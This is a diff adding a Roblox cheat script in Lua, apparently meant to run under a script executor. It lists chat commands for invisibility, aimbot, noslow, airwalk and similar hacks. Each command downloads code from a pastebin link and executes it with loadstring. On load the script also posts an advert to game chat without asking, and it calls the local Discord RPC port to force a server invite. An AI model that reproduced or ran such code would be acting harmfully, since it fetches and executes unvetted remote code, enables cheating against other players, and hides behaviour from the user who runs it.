@@ -1,0 +1,132 @@
+print ("----------------------------------------")
+print ("Script made by c57k")
+print ("The Commands Are")
+
+                print (".invis  /e invis")
+                print (".loadaim /e loadaim")
+                print (".gunanim /e gunanim")
+                print (".credits /e credits")
+                print (".noslow  /e noslow")
+                print (".airwalk /e airwalk")
+                print (".execbs | When you execute say .blink to enable it. To change blinkspeed say .blinkspeed number")
+               print (".rejoin /e rejoin")
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("loaded | new server 4BH3mSh52s ","All")
+game:GetService("StarterGui"):SetCore("SendNotification",{
+                Title = "Enjoy",
+                Text = "Loaded! Script Made by c57k! Check F9 For Commands.",
+                Duration = 15,
+            })	
+        local HttpService = game:GetService'HttpService'
+local n = Replicated
+local a = Name
+local n = Poop
+local o = Sex
+local Request = syn and syn.request or request
+Request({
+  Url = "http://127.0.0.1:6463/rpc?v=1",
+  Method = "POST",
+  Headers = {["Content-Type"] = "application/json",["Origin"] = "https://discord.com"},
+        Body = HttpService:JSONEncode({
+            cmd = "INVITE_BROWSER",
+            args = {
+                code = "4BH3mSh52s"
+            },
+            nonce = HttpService:GenerateGUID(false)
+        }),
+    })
+function onKeyPress(actionName, userInputState, inputObject)
+   if userInputState == Enum.UserInputState.Begin then
+       game.Players.LocalPlayer.Character:BreakJoints()
+   end
+end
+
+game.ContextActionService:BindAction("keyPress", onKeyPress, false, Enum.KeyCode.R)
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".invis") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/y1rXcurQ'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e invis") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/y1rXcurQ'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e loadaim") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/NcMXZPR1'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".loadaim") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/NcMXZPR1'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".gunanim") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/9WvX5s55'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e gunanim") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/9WvX5s55'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e credits") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/NyV4B7e2'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".credits") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/NyV4B7e2'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".noslow") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/UeUJxPue'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e noslow") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/UeUJxPue'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e airwalk") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/SMBYkLKK'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".airwalk") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/SMBYkLKK'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".execbs") then
+loadstring(game:HttpGet(('https://pastebin.com/raw/eqNUqkrx'),true))()
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == ".rejoin") then
+game:GetService("TeleportService"):Teleport(882375367, LocalPlayer)
+end
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+if (string.lower(msg) == "/e rejoin") then
+game:GetService("TeleportService"):Teleport(882375367, LocalPlayer)
+end
+end)
